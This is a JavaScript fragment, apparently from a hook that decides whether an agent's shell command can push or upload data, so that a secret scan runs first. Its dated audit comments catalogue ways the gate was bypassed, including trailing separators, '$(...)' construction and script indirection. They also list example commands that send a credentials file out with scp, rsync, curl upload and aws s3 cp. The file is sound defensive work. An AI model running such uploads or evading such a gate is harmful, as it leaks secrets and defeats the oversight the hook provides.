  if (/(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+alias[ \t]+set/i.test(c)) return true;
  // 2026-07-11 fix (found live, in real use, not just review): there used
  // to be a blanket fallback here — "if the command has any compound
  // operator (&&, ;, |, etc.) AND contains the bare substring 'gh', treat
  // it as push-capable." It was meant to catch obfuscated pushes hidden
  // behind chaining, but every regex above is UNANCHORED, so `.test()`
  // already finds a real `git push`/`gh repo create`/etc. anywhere in the
  // string, compound or not — the fallback added no real detection power.
  // What it DID do: block nearly every ordinary `cd <dir> && gh <anything>`
  // command — including harmless reads like `gh repo view`/`gh auth
  // status`/`gh api user` — because this environment's Bash tool doesn't
  // reliably persist a working directory, so "cd X && gh Y" is the normal
  // way to run almost any gh command here. Removed: it failed at stopping
  // real obfuscation (the `$(...)`-construction bypass below defeats it
  // just the same as everything else) while blocking completely ordinary,
  // safe usage. Indirection: running a script file, a Makefile target, or a
  // package-manager task can contain a push with no "push"/"gh" text in
  // THIS command. Fail closed rather than assume it's safe.
  //
  // 2026-07-11 Round 4 audit fix: this keyword list only covered the
  // PRIVATE-publish action (deploy/release/publish/ship). This project also
  // has a separately-gated GOING-PUBLIC action (see isGoPublicCommand /
  // GO-PUBLIC-APPROVED above) with its own, differently-worded vocabulary —
  // a script named e.g. `make-repo-public.mjs` or `visibility-change.mjs`
  // contained none of the four original keywords, so it fell through this
  // heuristic entirely and got an unconditional pass, unlike an
  // equivalently-indirect `publish-app.mjs`. Added `public`/`visibility` so
  // both gated actions get the same fail-closed treatment.
  // 2026-07-11 Round 5 audit fix: this extension match had no /i flag while
  // the keyword match right next to it already did — an upper/mixed-case
  // extension (`node EVIL.MJS`, plausible on the case-insensitive
  // filesystems this plugin actually runs on) silently skipped script-
  // indirection detection entirely, for any script, not just a
  // confirm-script look-alike. Made case-insensitive to match its neighbour.
  // 2026-07-12 audit fix (safe-direction false-positive): the execution-
  // prefix group was OPTIONAL, so this rule only actually required (a) any
  // path ending in one of the four extensions appearing ANYWHERE in the
  // command, plus (b) one of the keywords appearing anywhere else — with no
  // requirement that the script is actually being executed. Reproduced live:
  // `grep -n "visibility" hooks.test.mjs` and a heredoc merely writing the
  // literal text "gh repo edit ... --public" into a fixture file were both
  // misclassified as push-capable, purely because a `.mjs` path and a
  // keyword co-occurred in the command string — this interfered with this
  // very audit's own read-only commands. Made the prefix mandatory (an
  // actual `./`, `bash `, `sh `, `node `, or `python[3] ` invocation) so a
  // bare mention of a script path in grep/cat/echo/a heredoc body no longer
  // counts as indirection. `python[3] ` added to the mandatory set so this
  // doesn't newly lose detection of a `.py` script run the normal way (it
  // was previously "detected" only as a side effect of the prefix being
  // optional, since python was never in the prefix list to begin with).
  // 2026-07-12 Round 2 re-verification fix (CRITICAL, found by execution):
  // this regex's OWN trailing anchor was still the old, too-narrow
  // `([ \t]|$)` — it was not on the list of regexes migrated to
  // LEXICAL_BOUNDARY earlier this round (the git-push/gh--push/send-pack
  // regexes above, and gate.mjs's bare --public), so the identical bypass
  // class reappeared here: `node evil-release.mjs;` (and the same with
  // `|`, `&`, `)`, a backtick, or a trailing newline, and with any of the
  // ./,bash,sh,node,python3 prefixes) was misclassified as non-push,
  // reproduced live end-to-end with a real secret and zero confirmation
  // tokens recorded. Fixed with the same shared boundary as every other
  // regex in this function.
  // ---- 2026-08-24, X288: transports that are not git ------------------------------
  //
  // Every clause above this one is `git` or `gh`. X179's insight was that a DOCUMENTED INVOCATION
  // FORM had never been modelled — the dashed builtins `git-push` and `git-send-pack` — and the same
  // sentence is true one step out of every non-git way of moving tracked bytes off this machine.
  // Measured at the parent, all classified NOT push-capable, so the secret scan never ran at all:
  //
  //   scp creds.txt user@host:/tmp/        rsync -a . user@host:/srv/
  //   curl -T creds.txt https://…          aws s3 cp creds.txt s3://bucket/
  //   hub push origin main                 git svn dcommit
  //   git-receive-pack .                   git-http-push url
  //
  // Each is an ordinary command a build or deploy step runs, and each moves the same bytes the push
  // scan exists to look at.
  //
  // WHAT THIS DOES AND DELIBERATELY DOES NOT DO — the owner's decision of 2026-08-24, recorded
  // because the alternative is defensible and was rejected on purpose. `isPushCapable` gates whether
  // the tree is SCANNED; `sendsCommitsToRemote` gates the publishing-consent PROMPT, and these
  // transports are added to the first and NOT the second. So a `scp` of a clean tree stays completely
  // silent and only a real secret produces anything. Adding them to the consent prompt instead would
  // have stopped every deploy script that copies a file, which is the L5 failure — a gate that
  // interrupts honest work gets switched off and takes the real protection with it.
  //
  // NARROW ON PURPOSE, and this is where the false-alarm line sits. `scp` and `rsync` need a REMOTE
  // TARGET (`user@host:` or `host:/path`), so a local `rsync -a src/ dst/` is not matched. `curl`
  // needs an UPLOAD flag (`-T`, `--upload-file`, `-d`, `--data`, `-F`, `--form`), so an ordinary
  // download is not matched. `aws s3` needs `cp`, `mv` or `sync` with an `s3://` destination, so
  // `aws s3 ls` is not matched. Scanning is cheap and silent; being wrong here still costs, because
  // a scan that runs on every `curl` would find test fixtures in ordinary repositories.
  const REMOTE_TARGET = '[A-Za-z0-9_.+-]+@[A-Za-z0-9_.-]+:|[A-Za-z0-9_.-]+\\.[A-Za-z]{2,}:';
  if (new RegExp(`(^|[^A-Za-z0-9_])['"]?(scp|rsync)['"]?[ \\t].*(${REMOTE_TARGET})`, 'i').test(c))
    return true;
  // `sftp` is separated from the pair above because the colon test is wrong for it. A colon is what
  // distinguishes a remote target from a local one for scp and rsync — `rsync -a src/ dst/` is an
  // ordinary local copy and must stay silent. sftp has NO local mode: `sftp user@host` is already a
  // session with a remote, colon or no colon, so requiring one lost it.
  if (
    /(^|[^A-Za-z0-9_])['"]?sftp['"]?[ \t]+.*[A-Za-z0-9_.+-]+@[A-Za-z0-9_.-]+/i.test(c) ||
    new RegExp(`(^|[^A-Za-z0-9_])['"]?sftp['"]?[ \\t].*(${REMOTE_TARGET})`, 'i').test(c)
  )
    return true;
  if (
    /(^|[^A-Za-z0-9_])['"]?curl['"]?[ \t]/i.test(c) &&
    /[ \t](-T|--upload-file|-d|--data(-raw|-binary|-urlencode)?|-F|--form)([ \t=]|$)/i.test(c)
  )
    return true;
  if (
    /(^|[^A-Za-z0-9_])['"]?aws['"]?[ \t]+s3[ \t]+(cp|mv|sync)[ \t]/i.test(c) &&
    /s3:\/\//i.test(c)
  )
    return true;
  // Third-party git front ends and the non-`push` git transports. `hub` and `glab` are the GitHub and
  // GitLab equivalents of `gh`; `git svn dcommit` publishes to a Subversion remote; `git-receive-pack`
  // and `git-http-push` are dashed builtins X179 did not reach because it enumerated the two that
  // carry the word "push".
  if (
    new RegExp(
      `(^|[^A-Za-z0-9_./\\\\-])['"]?(hub|glab|jj)['"]?[ \\t]+.*['"]?(push|mr[ \\t]+create|pr[ \\t]+create)['"]?${LEXICAL_BOUNDARY}`,
      'i',
    ).test(c)
  )
    return true;
  if (/(^|[^A-Za-z0-9_])['"]?git['"]?[ \t]+svn[ \t]+dcommit/i.test(c)) return true;
  if (
    new RegExp(
      `(^|[^A-Za-z0-9_./\\\\-])git-(receive-pack|http-push|upload-archive)${DASHED_END}`,
      'i',
    ).test(c)
  )
    return true;

  const SCRIPT_INDIRECTION_KEYWORDS = /(deploy|release|publish|ship|public|visibility)/i;
  if (
    new RegExp(
      `(^|[^A-Za-z0-9_])(\\.\\/|bash[ \\t]+|sh[ \\t]+|node[ \\t]+|python3?[ \\t]+)[^ \\t]*\\.(sh|mjs|js|py)${LEXICAL_BOUNDARY}`,
      'i',
    ).test(c) &&
    SCRIPT_INDIRECTION_KEYWORDS.test(c)
  )
    return true;
  if (/(^|[^A-Za-z0-9_])make[ \t]+\S+/i.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
  if (
    /(^|[^A-Za-z0-9_])(npm|pnpm|yarn)[ \t]+run[ \t]+\S+/i.test(c) &&
    SCRIPT_INDIRECTION_KEYWORDS.test(c)
  )
    return true;
  return false;
}
